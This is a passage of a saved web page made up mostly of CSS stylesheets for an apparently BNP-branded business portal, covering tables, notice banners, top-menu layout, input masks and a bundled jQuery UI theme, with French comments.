	table.BNPTable.BNPTableLight tbody tr:hover td { background-color: #F2F2F2; }
	
	table.BNPTable.BNPTableLight tr:last-child td { border-bottom: none; }
	table.BNPTable.BNPTableLight tbody tr td { background-color: #F9F9F9; }



	.BNPPanel {
		margin: 0px 20px 30px 20px;
	}
	
	.BNPPanel+.BNPPanel {
		border-top: 1px solid #d5cece;
	}
	

ul.noListStyle li {
	list-style: none;
}

table.tablePresentation {
	width: 100%;
	border: none;
	border-collapse: collapse;
}

	table.tablePresentation td {
		padding: 4px;
		border-color: #FFF;
		border-style: solid;
		border-collapse: collapse;
		border-width: 2px;
	}
/***************************************************************************/
/*** UTILISE POUR LE FILTRAGE DE LA LISTE DES FACTURES ET AVOIR EN STOCK ***/
/*** APO : NL_ACHListeFacture, page : P_Filtre_Recherche                 ***/
#total_facture{
	text-align:center;
	margin:10px;
}
#lien_enregistrer_tout{
	margin-left:10px;
}


/* SAI */

h2.titreParenthese {
	font-size: 15px;
	font-weight: bold;
	text-transform: none;
	color: #7CBB00;
	line-height: 15px;
	margin-top: 25px;
	margin-bottom: 20px;
}
	h2.titreParenthese span:first-letter { text-transform: uppercase;}

h2.titreParenthese:before {
	content: "[";
	color: #7CBB00;
	font-style: italic;
	font-size: 25px;
	font-weight: normal;
	margin-right: 2px;
	text-decoration: none;
}

h2.titreParenthese:after {
	content: "]";
	color: #7CBB00;
	font-style: italic;
	font-size: 25px;
	font-weight: normal;
	margin-left: 2px;
	text-decoration: none;
}

	a[data-can-click="false"],
	a[data-nodroit="true"]
	{ color: #A2A2A2; }

	a[data-can-click="false"]:hover,
	a[data-nodroit="true"]:hover {
		text-decoration: none;
		cursor: text;
	}

	.menuInfos {
		width: 50%;
		margin: -5px 0px 25px 10px;
	}
	
/*
 *  BNPmask
 */
 
 .BNPmask_currency {
	text-align: right;
	padding: 2px;
 }
 
 /*
  * Maske de saisie %
  */
 .BNPmask_pct_render {
	display: inline-block;
	position: relative;
	margin-right: 5px;
	
 }
	.BNPmask_pct_render input[type="text"] {
		padding-right: 16px;
		width: 50px;
	}
	/* masque la croix pour vider le champ sous IE10 */
	.BNPmask_pct_render input[type="text"]::-ms-clear {display: none;}
	
 .BNPmask_pct_render:after {
	content: "%";
	margin-left: -15px; 
	width: 15px;
	vertical-align: middle;
	position: relative;
 }
 
 /*
  * Style plus "large" pour les combobox
  */
	select.BNPcombobox option {
		padding: 5px;
		border-bottom: 1px solid #CBCBCB;
	}
  
  	select.BNPcombobox option:last-child {
		border-bottom: none;
	}
	
	select.BNPcombobox option.selectedOption {
		font-weight: bold;
	}
	
	/*
	 * soustitre pour un h1
	 */
	h1.titreprincipal + .sstitre {
		margin-top: -13px;
		display: block;
		font-size: 12px;
		letter-spacing: -1px;
		color: rgb(111, 111, 111);
		font-weight: bold;
		margin-bottom: 15px;
	}
	
	.waitingUpdate .onUpdateHide {
		display: none;
	}
	
	.fond_cr.waitingUpdate {
		background : #e8e8e9 /*savepage-url=/tra_cosmos_img/loader/wait-dotE8E8E9-16x5.gif*/ url() 50% 50% no-repeat;
	}
	
	.ll.waitingUpdate {
		background : #FFFFFF /*savepage-url=/tra_cosmos_img/loader/wait-dotE8E8E9-16x5.gif*/ url() 50% 50% no-repeat;
	}
	
	.waitingUpdate.waitingRight { background-position: 90% 50%; }
	.waitingUpdate.waitingLeft { background-position: 10% 50%; }
	
	.cadre_pave{
		background-color:#B5CDE5;
		width: 95%;
		padding-bottom: 5px;
	}
	.cadre_pave_titre{
		margin-top:10px;
		font-weight:bold;
	}
	.cadre_pave_titre_non_select{
		font-weight:normal;
	}
	.titre_etape{
		font: 12px Arial,sans-serif;
		font-weight:normal;
		color:#586866;
	}
	.titre_etape_selected{
		font: 12px Arial,sans-serif;
		font-weight:bold;
	}
	
	button.btn_fin{
		padding:0;
		width:60px
	}
	
#cgdemat p {
	margin: 10px 0px 5px 0px;
}

.erreur_ligne {
	width: 600px;
	font-size: 10px; 
	font-family: Verdana; 
	text-align: center; 
	font-weight:bold;
}
.bloc_message_ok_edivir{
	width:500px;
	margin:auto;
	margin-top:100px;
	border:2px solid #A4A5A7;
	text-align:center;
	height:100px;
	padding-top:20px;
}

/*
 *	Styles pour les BNPNotices
 */

#noticeContenair {margin: 10px -4px -10px -2px;}

#vousetesici + #noticeContenair { margin-bottom: 0px; }
	
.BNPNotice {
	position: relative;
	margin: 5px 15px;
}
	.BNPNotice .BNPNoticeBodyClass {
		position: relative;
		border-radius: 7px;
/*		background-color: #828282;*/

		background: #606c88; /* Old browsers */
		background: -moz-linear-gradient(top, #606c88 0%, #3f4c6b 100%); /* FF3.6+ */
		background: -webkit-gradient(linear, left top, left bottom, color-stop(0%,#606c88), color-stop(100%,#3f4c6b)); /* Chrome,Safari4+ */
		background: -webkit-linear-gradient(top, #606c88 0%,#3f4c6b 100%); /* Chrome10+,Safari5.1+ */
		background: -o-linear-gradient(top, #606c88 0%,#3f4c6b 100%); /* Opera 11.10+ */
		background: -ms-linear-gradient(top, #606c88 0%,#3f4c6b 100%); /* IE10+ */
		background: linear-gradient(to bottom, #606c88 0%,#3f4c6b 100%); /* W3C */
		filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#606c88', endColorstr='#3f4c6b',GradientType=0 ); /* IE6-9 */		
		
		color: #f9f9f9;
		font-size: 1.3em;
		padding: 0px;
	}

		.BNPNotice .BNPNoticeBodyClass>h1 {margin-top: 0px;}
	
	.BNPNotice .BNPNoticeButtonClose {
		position: absolute;
		right: 2px;
		top: 3px;
		color: #FFFFFF;
		line-height: 10px;
		width: 13px;
		height: 13px;
		text-align: center;
	}
		.BNPNotice .BNPNoticeButtonClose:hover {
			background-color: rgba(255,255,255,0.4);
			border-radius: 13px;
			
		}

	.BNPNotice.BNPNoticeClosed {
		display: none;
	}
	
	
	/*
	 * Theme classique light blue #0091DE
	 */
		.BNPNotice.lightBlue  .BNPNoticeBodyClass {
			border-radius: 0px;
			border: 1px solid #42A7D8;
			background: #0091DE;
			color: white;
			font-size: 1.0em;
			filter: none; /* si non le dégradé reste sur IE9/IE8 */
		}
			.BNPNotice.lightBlue .BNPNoticeBodyClass a {
				color: #3D84CB;
				font-weight: normal;
				background-color: #FFF;
				padding: 2px 3px;
				border-radius: 2px;
			}
		
		.BNPNotice.lightBlue  .BNPNoticeButtonClose {color: #42A7D8;}
		
		.BNPNotice.lightBlue  .BNPNoticeButtonClose:hover {
			background-color: #42A7D8;
			color: #0091DE;
		}
		
		/*
	 * Theme classique grisclair #f1f1f1
	 */
		.BNPNotice.grisclair  .BNPNoticeBodyClass {
			border-radius: 0px;
			border: 1px solid #e1e1e1;
			background: #f1f1f1;
			color: black;
			font-size: 1.0em;
			filter: none; /* si non le dégradé reste sur IE9/IE8 */
		}
			.BNPNotice.grisclair .BNPNoticeBodyClass a {
				color: black;
				font-weight: normal;
				text-decoration: underline;
			}
		
		.BNPNotice.grisclair .BNPNoticeBodyClass .titre {
				color: #0091DE;
				font-weight: bold;
				font-size: 1.2em;
			}
			
		.BNPNotice.grisclair .BNPNoticeBodyClass .gras {
				color: #0091DE;
				font-weight: bold;
				font-size: 1.0em;
			}
		
		.BNPNotice.grisclair  .BNPNoticeButtonClose {color: #f1f1f1;}
		
		.BNPNotice.grisclair  .BNPNoticeButtonClose:hover {
			background-color: #f1f1f1;
			color: #f1f1f1;
		}
		
		
		/*
	 * Theme classique vert #00975E;
	 */
		.BNPNotice.vert  .BNPNoticeBodyClass {
			border-radius: 0px;
			border: 1px solid #e1e1e1;
			background: #00975E;
			color: black;
			font-size: 1.0em;
			filter: none; /* si non le dégradé reste sur IE9/IE8 */
		}
			.BNPNotice.vert .BNPNoticeBodyClass a {
				color: black;
				font-weight: normal;
				text-decoration: underline;
			}
		
		.BNPNotice.vert .BNPNoticeBodyClass .titre {
				color: #0091DE;
				font-weight: bold;
				font-size: 1.2em;
			}
			
		.BNPNotice.vert .BNPNoticeBodyClass .gras {
				color: #0091DE;
				font-weight: bold;
				font-size: 1.0em;
			}
		
		.BNPNotice.vert  .BNPNoticeButtonClose {color: #f1f1f1;}
		
		.BNPNotice.vert  .BNPNoticeButtonClose:hover {
			background-color: #f1f1f1;
			color: #f1f1f1;
		}
		.BNPNotice.vert  .BNPNoticeBodyClass {
			border-radius: 0px;
			border: 1px solid #e1e1e1;
			background: #00975E;
			color: black;
			font-size: 1.0em;
			filter: none; /* si non le dégradé reste sur IE9/IE8 */
		}
			.BNPNotice.vert .BNPNoticeBodyClass a {
				color: black;
				font-weight: normal;
				text-decoration: underline;
			}
		
		.BNPNotice.vert .BNPNoticeBodyClass .titre {
				color: #0091DE;
				font-weight: bold;
				font-size: 1.2em;
			}
			
		.BNPNotice.vert .BNPNoticeBodyClass .gras {
				color: #0091DE;
				font-weight: bold;
				font-size: 1.0em;
			}
		
		.BNPNotice.vert  .BNPNoticeButtonClose {color: #f1f1f1;}
		
		.BNPNotice.vert  .BNPNoticeButtonClose:hover {
			background-color: #f1f1f1;
			color: #f1f1f1;
		}

	/*
	 * Theme protection_donnees ;
	 */
		.BNPNotice.protection_donnees  .BNPNoticeBodyClass {
			border-radius: 0px;
			/*border: 0.5px solid rgb(200,200,200);*/
			background: #FFFFFF;
			/*color: black;*/
			filter: none; /* si non le dégradé reste sur IE9/IE8 */
		}
		.BNPNotice.protection_donnees .BNPNoticeBodyClass a {
			color: #0091de;
			font-weight: normal;
			text-decoration: none;		
			font-size: 1.2em;			
			font-weight:bold;
		}
		
		.BNPNotice.protection_donnees .BNPNoticeBodyClass .titre {
				color: #0091DE;
				font-weight: bold;
				font-size: 1.2em;
			}
			
		.BNPNotice.protection_donnees .BNPNoticeBodyClass .gras {
				color: #0091DE;
				font-weight: bold;
				font-size: 1.0em;
			}
		
		.BNPNotice.protection_donnees  .BNPNoticeButtonClose {color: #f1f1f1;}
		
		.BNPNotice.protection_donnees  .BNPNoticeButtonClose:hover {
			background-color: #f1f1f1;
			color: #f1f1f1;
		}
		
	
.formRechAv{
width:15%;
}

.formRechAvRight{
border-left:1px solid #000;
}

.dataTables_empty{
font-size: 14px;
font-weight: bold;
text-align: center;
padding-top: 14px;
}

form[name="formRechercheRemise"] input[type="text"]{
width:228px;
}

form[name="formRechercheRemise"] input.ll_date {
width:70px;
}

#titre_contrat_compte{
	float:left;
	font-weight:bold;
	color:#7CBB00;
	font-size:12px;	
}
.contrat_compte{
	font-weight:bold;
	font-size:12px;	
}
/* 25/01/2018 - on retire la promo myview : à supprimer définitivement dans 6 mois
.promo_myview{
	position:absolute;
	top:5px;
	left:800px;
	width: 150px;
	vertical-align: bottom;
	margin-bottom: 10px;
	cursor:pointer;
}
.promo_myview:hover .message_myview{
	display:block !important;	
}
.promo_myview .message_myview{
	display:none;
	border:1px solid #009463;
	background-color:white;	
	height:40px;
	position:absolute;	
	/ * left:-230px;* /
	right:0px;
	top:55px;
	padding:5px 5px 5px 60px;
	z-index:1;
}
.message_myview span{
	float:left;
	font-size: 14px;
	color: #009463;
	white-space:nowrap;
	margin-top:5px;
}
.message_myview img{
	position:absolute;
	left:10px;
}
.promo_myview_trad{
	display: inline;
	float: left;
	margin-top: 20px;
	margin-left: -25px;
	font-size: 14px;
	color: #009463;
	font-weight: bold;
}
*/
.protection_donnees{
	border: 1px solid rgb(200,200,200); 
	font-size:0.8em;
	text-align:center; 
	font-weight:bold;
	background:none ;
}</style>
<style data-savepage-href="/tra_cosmos_css/GOP/Portail_Connexion.css" type="text/css">.msg_information {
background-color : #F6F6F6;
color:#000000;
padding:5px;
width:303px;
min-height: 65px;
}


.msg_info_text, .msg_info_logo{
float :left;
}


.msg_info_text{
width:250px;
}

.msg_information a{
    font-weight: bold;
    text-decoration: underline;
	color: #0091DE;

    /*color: #7CBB00;*/
}

.text_info_pave{
line-height: 11px;
font-size:10px;
}

.lien_info_pave{
margin : 5px 0 0 0;
}</style>
<style data-savepage-href="/tra_cosmos_css/style_menu_haut.css" type="text/css">/*******************************************/
/*** CSS commun ࠬ'ensemble des sites *****/
/*******************************************/

.space_mh {
	padding-top: 3px;
}
.menu {
    left:0px;
    top:0px;
    width:931px;
    height:31px;
    clear:both;
}
/* surcharge pour le style large */
	body.large .menu{width:100%;}
	body.large .menu ul#ulnav {width: 100%; margin: 0;}
	body.large .menu ul#ulnav li#item00 {width: 100%;}
	body.large .menu ul#ulnav li#item01 a {width: 220px;}
	body.large .menu ul#ulnav li#item02 a,body.large .menu ul#ulnav li#item02.pldesactive {width: 190px;}
	body.large .menu ul#ulnav li#item03 a,body.large .menu ul#ulnav li#item03.pldesactive {width: 223px;}
	body.large .menu ul#ulnav li#item04 a,body.large .menu ul#ulnav li#item04.pldesactive {width: 208px;}
	body.large .menu ul#ulnav li#item05 a {width: 240px;}
	body.large .menu ul#ulnav li#item06 a {width: 244px;}
	body.large .menu ul#ulnav  li#rf_item01 a {width: 257px;}
	body.large .menu ul#ulnav li#rf_item02 a,body.large .menu ul#ulnav li#rf_item02.pldesactive {width: 257px;}
	body.large .menu ul#ulnav li#rf_item03 a,body.large .menu ul#ulnav li#rf_item03.pldesactive {width: 257px;}
	
	body.large .menu ul#ulnav li#rf_item03:last-child a, body.large .menu ul#ulnav li#rf_item03.pldesactive:last-child {width: 282px;}


.menu ul#ulnav {
    width: 930px;
    padding: 0;
    margin: 0 13px 0 13px; /* 0px */
    list-style: none;
	display: table;
	background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x;
}
.menu ul#ulnav li {
    padding: 0;
    margin: 0;
    float: left;
    display: inline;
}
.menu ul#ulnav li a {
    display: block;
    height: 31px;
}
.menu ul#ulnav li#item99 {
    width: 1px;
    height: 31px;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut_separation.jpg*/ url() no-repeat;
}
.menu ul#ulnav li#item00 {
    height: 31px;
    width: 931px;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x;
}
.menu ul#ulnav li#item98 {
    height: 31px;
    width: 550px;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x;
}
.menu ul#ulnav li#rf_item98 {
    height: 31px;
    width: 360px;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x;
}
.menu ul#ulnav li#df_item98 {
    height: 31px;
    width: 190px;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x;
}
.menu ul#ulnav li#rf_item97 {
    height: 31px;
    width: 740px;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x;
}

.menu ul#ulnav li#cop_item98 {
    height: 31px;
    width: 169px;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x;
}

.menu ul#ulnav li#edivir_item98 {
    height: 31px;
    width: 360px;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x;
}

.menu ul#ulnav li#item01, .menu ul#ulnav li#item02, .menu ul#ulnav li#item03, .menu ul#ulnav li#item04, .menu ul#ulnav li#item05, 
.menu ul#ulnav li#item06, .menu ul#ulnav li#item07, .menu ul#ulnav li#item08, .menu ul#ulnav li#item09, .menu ul#ulnav li#item10,
.menu ul#ulnav li#rf_item01, .menu ul#ulnav li#rf_item02, .menu ul#ulnav li#rf_item03, .menu ul#ulnav li#cop_item98 {
    height: 31px;
    margin: 0px;
    list-style-type: none;
    position: relative;
} 
.menu ul#ulnav li#item01 a, .menu ul#ulnav li#item02 a, .menu ul#ulnav li#item03 a, .menu ul#ulnav li#item04 a, .menu ul#ulnav li#item05 a, 
.menu ul#ulnav li#item06 a, .menu ul#ulnav li#item07 a, .menu ul#ulnav li#item08 a, .menu ul#ulnav li#item09 a, .menu ul#ulnav li#item10 a, 
.menu ul#ulnav li#rf_item01 a, .menu ul#ulnav li#rf_item02 a, .menu ul#ulnav li#rf_item03 a, .menu ul#ulnav li#cop_item98 a {
    height: 31px;
    font-size: 11px;
    text-transform: uppercase;
    text-decoration: none;
    text-align: center;
    color : #878787;
		background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x;
} 

.menu ul#ulnav li#item01.pldesactive, .menu ul#ulnav li#item02.pldesactive, .menu ul#ulnav li#item03.pldesactive, .menu ul#ulnav li#item04.pldesactive, .menu ul#ulnav li#item05.pldesactive , 
.menu ul#ulnav li#item06.pldesactive, .menu ul#ulnav li#item07.pldesactive, .menu ul#ulnav li#item08.pldesactive, .menu ul#ulnav li#item09.pldesactive, .menu ul#ulnav li#item10.pldesactive,
.menu ul#ulnav li#rf_item01.pldesactive, .menu ul#ulnav li#rf_item02.pldesactive, .menu ul#ulnav li#rf_item03.pldesactive, .menu ul#ulnav li#cop_item98.pldescative {
    height: 31px;
    font-size: 11px;
    text-transform: uppercase;
    text-decoration: none;
    text-align: center;
    color : #C0C0C0;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut.jpg*/ url() repeat-x; 
}

/********************************************/
/*** CSS modifiable en fonction des sites ***/
/********************************************/

.menu ul#ulnav li#item01 a:hover, .menu ul#ulnav li#item01.selected a, .menu ul#ulnav li#item02 a:hover, .menu ul#ulnav li#item02.selected a,
.menu ul#ulnav li#item03 a:hover, .menu ul#ulnav li#item03.selected a, .menu ul#ulnav li#item04 a:hover, .menu ul#ulnav li#item04.selected a,
.menu ul#ulnav li#item05 a:hover, .menu ul#ulnav li#item05.selected a, .menu ul#ulnav li#item06 a:hover, .menu ul#ulnav li#item06.selected a ,
.menu ul#ulnav li#rf_item01 a:hover, .menu ul#ulnav li#rf_item01.selected a, .menu ul#ulnav li#rf_item02 a:hover, .menu ul#ulnav li#rf_item02.selected a,
.menu ul#ulnav li#rf_item03 a:hover, .menu ul#ulnav li#rf_item03.selected a, .menu ul#ulnav li#cop_item98 a:hover, .menu ul#ulnav li#cop_item98.selected a {
    color: #7cbb00;
    background: /*savepage-url=/tra_cosmos_img/fond_menu_haut_color_0010.jpg*/ url() repeat-x;
}
.menu ul#ulnav li#item01 a {
    width: 140px;
}
.menu ul#ulnav li#item02 a, .menu ul#ulnav li#item02.pldesactive {
    width: 140px;
}
.menu ul#ulnav li#item03 a, .menu ul#ulnav li#item03.pldesactive {
    width: 143px;
}
.menu ul#ulnav li#item04 a, .menu ul#ulnav li#item04.pldesactive {
    width: 148px;
}
.menu ul#ulnav li#item05 a {
    width: 180px;
}
.menu ul#ulnav li#item06 a {
    width: 174px;
}
.menu ul#ulnav  li#rf_item01 a {
    width: 189px;
}
.menu ul#ulnav li#rf_item02 a, .menu ul#ulnav li#rf_item02.pldesactive {
    width: 189px;
}
.menu ul#ulnav li#rf_item03 a, .menu ul#ulnav li#rf_item03.pldesactive {
    width: 189px;
}
</style>
<style data-savepage-href="/S027_E001/S027_E001_cosmos_css/style_color_0001.css" type="text/css">/* style g鮩ral */
td.ll {
	text-align: left;
}

.minuscule {
            text-transform: lowercase;
			color: #0091de;
        }


/* pour l'application GROUPE */
.tot {
	font-size: 12px;
}

/* pour COPILOTE */
.titre_camembert {
  text-transform: uppercase;
  text-align: left !important;
  font-size: 10px;
  padding: 10px;
}

div.dataTables_wrapper {
	position: relative;
	min-height: 302px;
	clear: both;
	_height: 302px;
	padding-top: 1px;
	zoom: 1; /* Feeling sorry for IE */
}
</style>
<style type="text/css" media="screen">
.slides_container { width:558px; display:none;}
.slides_container div.slide { width:558px; height:340px; display:block;	}
.item { float:left; width:100%; height:100%; margin:0 0px; }
.pagination { list-style:none; display:inline; margin:0; padding:0; }
.pagination .current a { color:#0091DE; }
</style>
<script language="JavaScript" data-savepage-src="/tra_cosmos_js/carrousel.js" data-savepage-type="text/javascript" type="text/plain"></script>
<script language="JavaScript" data-savepage-src="/tra_cosmos_js/slides.jquery.js" data-savepage-type="text/javascript" type="text/plain"></script>
<!-- DEB pave digital -->
	<style data-savepage-href="/tra_cosmos_css/jquery-ui-reinitialisation_mot_de_passe.css" type="text/css">/*! jQuery UI - v1.11.4 - 2015-11-24
* http://jqueryui.com
* Includes: core.css, draggable.css, resizable.css, button.css, dialog.css, theme.css
* To view and modify this theme, visit http://jqueryui.com/themeroller/
* Copyright jQuery Foundation and other contributors; Licensed MIT */

/* Layout helpers
----------------------------------*/
.ui-helper-hidden {
	display: none;
}
.ui-helper-hidden-accessible {
	border: 0;
	clip: rect(0 0 0 0);
	height: 1px;
	margin: -1px;
	overflow: hidden;
	padding: 0;
	position: absolute;
	width: 1px;
}
.ui-helper-reset {
	margin: 0;
	padding: 0;
	border: 0;
	outline: 0;
	line-height: 1.3;
	text-decoration: none;
	font-size: 100%;
	list-style: none;
}
.ui-helper-clearfix:before,
.ui-helper-clearfix:after {
	content: "";
	display: table;
	border-collapse: collapse;
}
.ui-helper-clearfix:after {
	clear: both;
}
.ui-helper-clearfix {
	min-height: 0; /* support: IE7 */
}
.ui-helper-zfix {
	width: 100%;
	height: 100%;
	top: 0;
	left: 0;
	position: absolute;
	opacity: 0;
	filter:Alpha(Opacity=0); /* support: IE8 */
}

.ui-front {
	z-index: 100;
}


/* Interaction Cues
----------------------------------*/
.ui-state-disabled {
	cursor: default !important;
}


/* Icons
----------------------------------*/

/* states and images */
.ui-icon {
	display: block;
	text-indent: -99999px;
	overflow: hidden;
	background-repeat: no-repeat;
}


/* Misc visuals
----------------------------------*/

/* Overlays */
.ui-widget-overlay {
	position: fixed;
	top: 0;
	left: 0;
	width: 100%;
	height: 100%;
}
.ui-draggable-handle {
	-ms-touch-action: none;
	touch-action: none;
}
.ui-resizable {
	position: relative;
}
.ui-resizable-handle {
	position: absolute;
	font-size: 0.1px;
	display: block;
	-ms-touch-action: none;
	touch-action: none;
}
.ui-resizable-disabled .ui-resizable-handle,
.ui-resizable-autohide .ui-resizable-handle {
	display: none;
}
.ui-resizable-n {
	cursor: n-resize;
	height: 7px;
	width: 100%;
	top: -5px;
	left: 0;
}
.ui-resizable-s {
	cursor: s-resize;
	height: 7px;
	width: 100%;
	bottom: -5px;
	left: 0;
}
.ui-resizable-e {
	cursor: e-resize;
	width: 7px;
	right: -5px;
	top: 0;
	height: 100%;
}
.ui-resizable-w {
	cursor: w-resize;
	width: 7px;
	left: -5px;
	top: 0;
	height: 100%;
}
.ui-resizable-se {
	cursor: se-resize;
	width: 12px;
	height: 12px;
	right: 1px;
	bottom: 1px;
}
.ui-resizable-sw {
	cursor: sw-resize;
	width: 9px;
	height: 9px;
	left: -5px;
	bottom: -5px;
}
.ui-resizable-nw {
	cursor: nw-resize;
	width: 9px;
	height: 9px;
	left: -5px;
	top: -5px;
}
.ui-resizable-ne {
	cursor: ne-resize;
	width: 9px;
	height: 9px;
	right: -5px;
	top: -5px;
}
.ui-button {
	display: inline-block;
	position: relative;
	padding: 0;
	line-height: normal;
	margin-right: .1em;
	cursor: pointer;
	vertical-align: middle;
	text-align: center;
	overflow: hidden; /* removes extra width in IE */
}
.ui-button,
.ui-button:link,
.ui-button:visited,
.ui-button:hover,
.ui-button:active {
	text-decoration: none;
}
/* to make room for the icon, a width needs to be set here */
.ui-button-icon-only {
	width: 2.2em;
}
/* button elements seem to need a little more width */
button.ui-button-icon-only {
	width: 2.4em;
}
.ui-button-icons-only {
	width: 3.4em;
}
button.ui-button-icons-only {
	width: 3.7em;
}

/* button text element */
.ui-button .ui-button-text {
	display: block;
	line-height: normal;
}
.ui-button-text-only .ui-button-text {
	padding: .4em 1em;
}
.ui-button-icon-only .ui-button-text,
.ui-button-icons-only .ui-button-text {
	padding: .4em;
	text-indent: -9999999px;
}
.ui-button-text-icon-primary .ui-button-text,
.ui-button-text-icons .ui-button-text {
	padding: .4em 1em .4em 2.1em;
}
.ui-button-text-icon-secondary .ui-button-text,
.ui-button-text-icons .ui-button-text {
	padding: .4em 2.1em .4em 1em;
}
.ui-button-text-icons .ui-button-text {
	padding-left: 2.1em;
	padding-right: 2.1em;
}
/* no icon support for input elements, provide padding by default */
input.ui-button {
	padding: .4em 1em;
}

/* button icon element(s) */
.ui-button-icon-only .ui-icon,
.ui-button-text-icon-primary .ui-icon,
.ui-button-text-icon-secondary .ui-icon,
.ui-button-text-icons .ui-icon,
.ui-button-icons-only .ui-icon {
	position: absolute;
	top: 0%;
	margin-top: -8px;
}
.ui-button-icon-only .ui-icon {
	left: 0%;
	margin-left: -8px;
}
.ui-button-text-icon-primary .ui-button-icon-primary,
.ui-button-text-icons .ui-button-icon-primary,
.ui-button-icons-only .ui-button-icon-primary {
	left: .5em;
}
.ui-button-text-icon-secondary .ui-button-icon-secondary,
.ui-button-text-icons .ui-button-icon-secondary,
.ui-button-icons-only .ui-button-icon-secondary {
	right: .5em;
}

/* button sets */
.ui-buttonset {
	margin-right: 7px;
}
.ui-buttonset .ui-button {
	margin-left: 0;
	margin-right: -.3em;
}

/* workarounds */
/* reset extra padding in Firefox, see h5bp.com/l */
input.ui-button::-moz-focus-inner,
button.ui-button::-moz-focus-inner {
	border: 0;
	padding: 0;
}
.ui-dialog {
	overflow: hidden;
	position: absolute;
	top: 0;
	left: 0;
	padding: .2em;
	outline: 0;
}
.ui-dialog .ui-dialog-titlebar {
	padding: .4em 1em;
	position: relative;
}
.ui-dialog .ui-dialog-title {
	float: left;
	margin: .1em 0;
	white-space: nowrap;
	width: 90%;
	overflow: hidden;
	text-overflow: ellipsis;
}
.ui-dialog .ui-dialog-titlebar-close {
	position: absolute;
	right: .3em;
	top: 50%;
	width: 20px;
	margin: -10px 0 0 0;
	padding: 1px;
	height: 20px;
}
.ui-dialog .ui-dialog-content {
	position: relative;
	border: 0;
	padding: .5em 1em;
	background: none;
	overflow: auto;
}
.ui-dialog .ui-dialog-buttonpane {
	text-align: left;
	border-width: 1px 0 0 0;
	background-image: none;
	margin-top: .5em;
	padding: .3em 1em .5em .4em;
}
.ui-dialog .ui-dialog-buttonpane .ui-dialog-buttonset {
	float: right;
}
.ui-dialog .ui-dialog-buttonpane button {
	margin: .5em .4em .5em 0;
	cursor: pointer;
}
.ui-dialog .ui-resizable-se {
	width: 12px;
	height: 12px;
	right: -5px;
	bottom: -5px;
	background-position: 16px 16px;
}
.ui-draggable .ui-dialog-titlebar {
	cursor: move;
}

/* Component containers
----------------------------------*/
.ui-widget {
	font-family: Verdana,Arial,sans-serif;
	font-size: 1.1em;
}
.ui-widget .ui-widget {
	font-size: 1em;
}
.ui-widget input,
.ui-widget select,
.ui-widget textarea,
.ui-widget button {
	font-family: Verdana,Arial,sans-serif;
	font-size: 1em;
}
.ui-widget-content {
	border: 1px solid #aaaaaa;
	background: #ffffff;
	color: #222222;
}
.ui-widget-content a {
	color: #222222;
}
.ui-widget-header {
	border: 1px solid #aaaaaa;
	background: #cccccc /*savepage-url=images/ui-bg_glass_75_dadada_1x400.png*/ url() 50% 50% repeat-x;
	color: #222222;
	font-weight: bold;
}
.ui-widget-header a {
	color: #222222;
}

/* Interaction states
----------------------------------*/
.ui-state-default,
.ui-widget-content .ui-state-default,
.ui-widget-header .ui-state-default {
	border: 1px solid #d3d3d3;
	background: #e6e6e6 /*savepage-url=images/ui-bg_glass_75_e6e6e6_1x400.png*/ url() 50% 50% repeat-x;
	font-weight: normal;
	color: #555555;
}
.ui-state-default a,
.ui-state-default a:link,
.ui-state-default a:visited {
	color: #555555;
	text-decoration: none;
}
.ui-state-hover,
.ui-widget-content .ui-state-hover,
.ui-widget-header .ui-state-hover,
.ui-state-focus,
.ui-widget-content .ui-state-focus,
.ui-widget-header .ui-state-focus {
	border: 1px solid #999999;
	background: #dadada /*savepage-url=images/ui-bg_glass_75_dadada_1x400.png*/ url() 50% 50% repeat-x;
	font-weight: normal;
	color: #212121;
}
.ui-state-hover a,
.ui-state-hover a:hover,
.ui-state-hover a:link,
.ui-state-hover a:visited,
.ui-state-focus a,
.ui-state-focus a:hover,
.ui-state-focus a:link,
.ui-state-focus a:visited {
	color: #212121;
	text-decoration: none;
}
.ui-state-active,
.ui-widget-content .ui-state-active,
.ui-widget-header .ui-state-active {
	border: 1px solid #aaaaaa;
	background: #ffffff /*savepage-url=images/ui-bg_glass_65_ffffff_1x400.png*/ url() 50% 50% repeat-x;
	font-weight: normal;
	color: #212121;
}
.ui-state-active a,
.ui-state-active a:link,
.ui-state-active a:visited {
	color: #212121;
	text-decoration: none;
}

/* Interaction Cues
----------------------------------*/
.ui-state-highlight,
.ui-widget-content .ui-state-highlight,
.ui-widget-header .ui-state-highlight {
	border: 1px solid #fcefa1;
	background: #fbf9ee /*savepage-url=images/ui-bg_glass_55_fbf9ee_1x400.png*/ url() 50% 50% repeat-x;
	color: #363636;
}
.ui-state-highlight a,
.ui-widget-content .ui-state-highlight a,
.ui-widget-header .ui-state-highlight a {
	color: #363636;
}
.ui-state-error,
.ui-widget-content .ui-state-error,
.ui-widget-header .ui-state-error {
	border: 1px solid #cd0a0a;
	background: #fef1ec /*savepage-url=images/ui-bg_glass_95_fef1ec_1x400.png*/ url() 50% 50% repeat-x;
	color: #cd0a0a;
}
.ui-state-error a,
.ui-widget-content .ui-state-error a,
.ui-widget-header .ui-state-error a {
	color: #cd0a0a;
}
.ui-state-error-text,
.ui-widget-content .ui-state-error-text,
.ui-widget-header .ui-state-error-text {
	color: #cd0a0a;
}
.ui-priority-primary,
.ui-widget-content .ui-priority-primary,
.ui-widget-header .ui-priority-primary {
	font-weight: bold;
}
.ui-priority-secondary,
.ui-widget-content .ui-priority-secondary,
.ui-widget-header .ui-priority-secondary {
	opacity: .7;
	filter:Alpha(Opacity=70); /* support: IE8 */
	font-weight: normal;
}
.ui-state-disabled,
.ui-widget-content .ui-state-disabled,
.ui-widget-header .ui-state-disabled {
	opacity: .35;
	filter:Alpha(Opacity=35); /* support: IE8 */
	background-image: none;
}
